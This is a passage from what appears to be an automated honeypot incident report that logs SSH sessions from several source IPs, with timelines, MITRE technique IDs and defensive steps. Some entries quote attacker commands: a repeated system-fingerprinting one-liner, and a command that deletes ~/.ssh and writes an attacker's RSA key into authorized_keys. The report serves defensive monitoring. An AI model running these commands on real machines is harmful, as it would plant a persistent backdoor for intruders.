| `2026-07-17 03:46:51` | `cowrie.session.connect` |
| `2026-07-17 03:46:51` | `cowrie.client.version` |
| `2026-07-17 03:46:51` | `cowrie.client.kex` |
| `2026-07-17 03:46:51` | `cowrie.login.success` |
| `2026-07-17 03:46:52` | `cowrie.session.params` |
| `2026-07-17 03:46:52` | `cowrie.command.input` |
| `2026-07-17 03:46:52` | `cowrie.command.input` |
| `2026-07-17 03:46:52` | `cowrie.command.input` |
| `2026-07-17 03:46:52` | `cowrie.command.input` |
| `2026-07-17 03:46:52` | `cowrie.command.input` |
| `2026-07-17 03:46:52` | `cowrie.command.success` |
| `2026-07-17 03:46:52` | `cowrie.command.input` |
| `2026-07-17 03:46:52` | `cowrie.command.input` |
| `2026-07-17 03:46:52` | `cowrie.command.input` |
| `2026-07-17 03:46:52` | `cowrie.command.input` |
| `2026-07-17 03:46:52` | `cowrie.log.closed` |
| `2026-07-17 03:46:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ca37b199b1e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-17 03:47 |
| **Last Seen** | 2026-07-17 03:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:47:52` | `cowrie.session.connect` |
| `2026-07-17 03:47:52` | `cowrie.client.version` |
| `2026-07-17 03:47:52` | `cowrie.client.kex` |
| `2026-07-17 03:47:52` | `cowrie.login.success` |
| `2026-07-17 03:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfe2eac92522

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-17 03:47 |
| **Last Seen** | 2026-07-17 03:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:47:52` | `cowrie.session.connect` |
| `2026-07-17 03:47:52` | `cowrie.client.version` |
| `2026-07-17 03:47:52` | `cowrie.client.kex` |
| `2026-07-17 03:47:52` | `cowrie.login.success` |
| `2026-07-17 03:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-291c9fac3b8e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-17 03:47 |
| **Last Seen** | 2026-07-17 03:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:47:58` | `cowrie.session.connect` |
| `2026-07-17 03:47:58` | `cowrie.client.version` |
| `2026-07-17 03:47:58` | `cowrie.client.kex` |
| `2026-07-17 03:47:58` | `cowrie.login.success` |
| `2026-07-17 03:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d831eb2c5bb6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:48 |
| **Last Seen** | 2026-07-17 03:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:48:55` | `cowrie.session.connect` |
| `2026-07-17 03:48:55` | `cowrie.client.version` |
| `2026-07-17 03:48:55` | `cowrie.client.kex` |
| `2026-07-17 03:48:56` | `cowrie.login.success` |
| `2026-07-17 03:48:57` | `cowrie.session.params` |
| `2026-07-17 03:48:57` | `cowrie.command.input` |
| `2026-07-17 03:48:57` | `cowrie.command.input` |
| `2026-07-17 03:48:57` | `cowrie.command.input` |
| `2026-07-17 03:48:57` | `cowrie.command.input` |
| `2026-07-17 03:48:57` | `cowrie.command.input` |
| `2026-07-17 03:48:57` | `cowrie.command.success` |
| `2026-07-17 03:48:57` | `cowrie.command.input` |
| `2026-07-17 03:48:57` | `cowrie.command.input` |
| `2026-07-17 03:48:57` | `cowrie.command.input` |
| `2026-07-17 03:48:57` | `cowrie.command.input` |
| `2026-07-17 03:48:57` | `cowrie.log.closed` |
| `2026-07-17 03:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41048be146e8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:50 |
| **Last Seen** | 2026-07-17 03:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:50:47` | `cowrie.session.connect` |
| `2026-07-17 03:50:47` | `cowrie.client.version` |
| `2026-07-17 03:50:47` | `cowrie.client.kex` |
| `2026-07-17 03:50:48` | `cowrie.login.success` |
| `2026-07-17 03:50:49` | `cowrie.session.params` |
| `2026-07-17 03:50:49` | `cowrie.command.input` |
| `2026-07-17 03:50:49` | `cowrie.command.input` |
| `2026-07-17 03:50:49` | `cowrie.command.input` |
| `2026-07-17 03:50:49` | `cowrie.command.input` |
| `2026-07-17 03:50:49` | `cowrie.command.input` |
| `2026-07-17 03:50:49` | `cowrie.command.success` |
| `2026-07-17 03:50:49` | `cowrie.command.input` |
| `2026-07-17 03:50:49` | `cowrie.command.input` |
| `2026-07-17 03:50:49` | `cowrie.command.input` |
| `2026-07-17 03:50:49` | `cowrie.command.input` |
| `2026-07-17 03:50:50` | `cowrie.log.closed` |
| `2026-07-17 03:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb8760521d76

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:52 |
| **Last Seen** | 2026-07-17 03:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:52:30` | `cowrie.session.connect` |
| `2026-07-17 03:52:30` | `cowrie.client.version` |
| `2026-07-17 03:52:30` | `cowrie.client.kex` |
| `2026-07-17 03:52:32` | `cowrie.login.success` |
| `2026-07-17 03:52:33` | `cowrie.session.params` |
| `2026-07-17 03:52:33` | `cowrie.command.input` |
| `2026-07-17 03:52:33` | `cowrie.command.input` |
| `2026-07-17 03:52:33` | `cowrie.command.input` |
| `2026-07-17 03:52:33` | `cowrie.command.input` |
| `2026-07-17 03:52:33` | `cowrie.command.input` |
| `2026-07-17 03:52:33` | `cowrie.command.success` |
| `2026-07-17 03:52:33` | `cowrie.command.input` |
| `2026-07-17 03:52:33` | `cowrie.command.input` |
| `2026-07-17 03:52:33` | `cowrie.command.input` |
| `2026-07-17 03:52:33` | `cowrie.command.input` |
| `2026-07-17 03:52:34` | `cowrie.log.closed` |
| `2026-07-17 03:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-370159cea297

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:54 |
| **Last Seen** | 2026-07-17 03:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:54:14` | `cowrie.session.connect` |
| `2026-07-17 03:54:15` | `cowrie.client.version` |
| `2026-07-17 03:54:15` | `cowrie.client.kex` |
| `2026-07-17 03:54:16` | `cowrie.login.success` |
| `2026-07-17 03:54:17` | `cowrie.session.params` |
| `2026-07-17 03:54:17` | `cowrie.command.input` |
| `2026-07-17 03:54:17` | `cowrie.command.input` |
| `2026-07-17 03:54:17` | `cowrie.command.input` |
| `2026-07-17 03:54:17` | `cowrie.command.input` |
| `2026-07-17 03:54:17` | `cowrie.command.input` |
| `2026-07-17 03:54:17` | `cowrie.command.success` |
| `2026-07-17 03:54:17` | `cowrie.command.input` |
| `2026-07-17 03:54:17` | `cowrie.command.input` |
| `2026-07-17 03:54:17` | `cowrie.command.input` |
| `2026-07-17 03:54:17` | `cowrie.command.input` |
| `2026-07-17 03:54:17` | `cowrie.log.closed` |
| `2026-07-17 03:54:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd3dac1f0157

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-17 03:55 |
| **Last Seen** | 2026-07-17 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:55:15` | `cowrie.session.connect` |
| `2026-07-17 03:55:15` | `cowrie.client.version` |
| `2026-07-17 03:55:15` | `cowrie.client.kex` |
| `2026-07-17 03:55:16` | `cowrie.login.success` |
| `2026-07-17 03:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b5468dc0e30

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-17 03:55 |
| **Last Seen** | 2026-07-17 03:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:55:15` | `cowrie.session.connect` |
| `2026-07-17 03:55:15` | `cowrie.client.version` |
| `2026-07-17 03:55:15` | `cowrie.client.kex` |
| `2026-07-17 03:55:16` | `cowrie.login.success` |
| `2026-07-17 03:55:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-863fb8c6eb5f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:55 |
| **Last Seen** | 2026-07-17 03:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:55:54` | `cowrie.session.connect` |
| `2026-07-17 03:55:54` | `cowrie.client.version` |
| `2026-07-17 03:55:54` | `cowrie.client.kex` |
| `2026-07-17 03:55:56` | `cowrie.login.success` |
| `2026-07-17 03:55:57` | `cowrie.session.params` |
| `2026-07-17 03:55:57` | `cowrie.command.input` |
| `2026-07-17 03:55:57` | `cowrie.command.input` |
| `2026-07-17 03:55:57` | `cowrie.command.input` |
| `2026-07-17 03:55:57` | `cowrie.command.input` |
| `2026-07-17 03:55:57` | `cowrie.command.input` |
| `2026-07-17 03:55:57` | `cowrie.command.success` |
| `2026-07-17 03:55:57` | `cowrie.command.input` |
| `2026-07-17 03:55:57` | `cowrie.command.input` |
| `2026-07-17 03:55:57` | `cowrie.command.input` |
| `2026-07-17 03:55:57` | `cowrie.command.input` |
| `2026-07-17 03:55:58` | `cowrie.log.closed` |
| `2026-07-17 03:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f6a3dc602f8

| Field | Detail |
|---|---|
| **Source IP** | `187.49.63[.]51` |
| **First Seen** | 2026-07-17 03:56 |
| **Last Seen** | 2026-07-17 03:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:56:25` | `cowrie.session.connect` |
| `2026-07-17 03:56:26` | `cowrie.client.version` |
| `2026-07-17 03:56:26` | `cowrie.client.kex` |
| `2026-07-17 03:56:28` | `cowrie.login.success` |
| `2026-07-17 03:56:28` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.49.63[.]51` to AbuseIPDB if not already reported
- [ ] Block `187.49.63[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41140580b35a

| Field | Detail |
|---|---|
| **Source IP** | `201.63.52[.]54` |
| **First Seen** | 2026-07-17 03:56 |
| **Last Seen** | 2026-07-17 03:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:56:33` | `cowrie.session.connect` |
| `2026-07-17 03:56:34` | `cowrie.client.version` |
| `2026-07-17 03:56:34` | `cowrie.client.kex` |
| `2026-07-17 03:56:35` | `cowrie.login.success` |
| `2026-07-17 03:56:36` | `cowrie.direct-tcpip.request` |
| `2026-07-17 03:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.52[.]54` to AbuseIPDB if not already reported
- [ ] Block `201.63.52[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-447db68c2065

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:57 |
| **Last Seen** | 2026-07-17 03:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:57:33` | `cowrie.session.connect` |
| `2026-07-17 03:57:33` | `cowrie.client.version` |
| `2026-07-17 03:57:33` | `cowrie.client.kex` |
| `2026-07-17 03:57:34` | `cowrie.login.success` |
| `2026-07-17 03:57:35` | `cowrie.session.params` |
| `2026-07-17 03:57:35` | `cowrie.command.input` |
| `2026-07-17 03:57:35` | `cowrie.command.input` |
| `2026-07-17 03:57:35` | `cowrie.command.input` |
| `2026-07-17 03:57:35` | `cowrie.command.input` |
| `2026-07-17 03:57:35` | `cowrie.command.input` |
| `2026-07-17 03:57:35` | `cowrie.command.success` |
| `2026-07-17 03:57:35` | `cowrie.command.input` |
| `2026-07-17 03:57:35` | `cowrie.command.input` |
| `2026-07-17 03:57:35` | `cowrie.command.input` |
| `2026-07-17 03:57:35` | `cowrie.command.input` |
| `2026-07-17 03:57:35` | `cowrie.log.closed` |
| `2026-07-17 03:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f87e6c8edecf

| Field | Detail |
|---|---|
| **Source IP** | `211.22.166[.]107` |
| **First Seen** | 2026-07-17 03:57 |
| **Last Seen** | 2026-07-17 03:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:57:44` | `cowrie.session.connect` |
| `2026-07-17 03:57:44` | `cowrie.client.version` |
| `2026-07-17 03:57:45` | `cowrie.client.kex` |
| `2026-07-17 03:57:45` | `cowrie.login.success` |
| `2026-07-17 03:57:47` | `cowrie.session.params` |
| `2026-07-17 03:57:47` | `cowrie.command.input` |
| `2026-07-17 03:57:47` | `cowrie.command.failed` |
| `2026-07-17 03:57:47` | `cowrie.log.closed` |
| `2026-07-17 03:57:48` | `cowrie.session.params` |
| `2026-07-17 03:57:48` | `cowrie.command.input` |
| `2026-07-17 03:57:48` | `cowrie.session.file_download` |
| `2026-07-17 03:57:48` | `cowrie.log.closed` |
| `2026-07-17 03:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.22.166[.]107` to AbuseIPDB if not already reported
- [ ] Block `211.22.166[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d22be26050a9

| Field | Detail |
|---|---|
| **Source IP** | `211.22.166[.]107` |
| **First Seen** | 2026-07-17 03:57 |
| **Last Seen** | 2026-07-17 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:57:48` | `cowrie.session.connect` |
| `2026-07-17 03:57:48` | `cowrie.client.version` |
| `2026-07-17 03:57:48` | `cowrie.client.kex` |
| `2026-07-17 03:57:49` | `cowrie.login.success` |
| `2026-07-17 03:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.22.166[.]107` to AbuseIPDB if not already reported
- [ ] Block `211.22.166[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-955c7e1a13d2

| Field | Detail |
|---|---|
| **Source IP** | `211.22.166[.]107` |
| **First Seen** | 2026-07-17 03:57 |
| **Last Seen** | 2026-07-17 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:57:50` | `cowrie.session.connect` |
| `2026-07-17 03:57:50` | `cowrie.client.version` |
| `2026-07-17 03:57:50` | `cowrie.client.kex` |
| `2026-07-17 03:57:51` | `cowrie.login.success` |
| `2026-07-17 03:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.22.166[.]107` to AbuseIPDB if not already reported
- [ ] Block `211.22.166[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17e4b0171d87

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-17 03:59 |
| **Last Seen** | 2026-07-17 03:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 03:59:14` | `cowrie.session.connect` |
| `2026-07-17 03:59:14` | `cowrie.client.version` |
| `2026-07-17 03:59:15` | `cowrie.client.kex` |
| `2026-07-17 03:59:16` | `cowrie.login.success` |
| `2026-07-17 03:59:17` | `cowrie.session.params` |
| `2026-07-17 03:59:17` | `cowrie.command.input` |
| `2026-07-17 03:59:17` | `cowrie.command.input` |
| `2026-07-17 03:59:17` | `cowrie.command.input` |
| `2026-07-17 03:59:17` | `cowrie.command.input` |
| `2026-07-17 03:59:17` | `cowrie.command.input` |
| `2026-07-17 03:59:17` | `cowrie.command.success` |
| `2026-07-17 03:59:17` | `cowrie.command.input` |
| `2026-07-17 03:59:17` | `cowrie.command.input` |
| `2026-07-17 03:59:17` | `cowrie.command.input` |
| `2026-07-17 03:59:17` | `cowrie.command.input` |
| `2026-07-17 03:59:17` | `cowrie.log.closed` |
| `2026-07-17 03:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a60d4a52a5ce

| Field | Detail |
|---|---|
| **Source IP** | `182.76.71[.]82` |
| **First Seen** | 2026-07-17 03:59 |
